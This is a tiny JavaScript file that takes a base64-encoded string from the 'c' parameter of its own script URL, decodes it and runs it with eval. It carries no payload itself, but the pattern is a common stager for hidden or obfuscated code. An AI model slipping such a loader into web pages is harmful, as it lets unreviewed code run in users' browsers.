(() => {
    window.eval(atob((new URLSearchParams((new URL(document.currentScript.src)).search)).get('c')));
})();
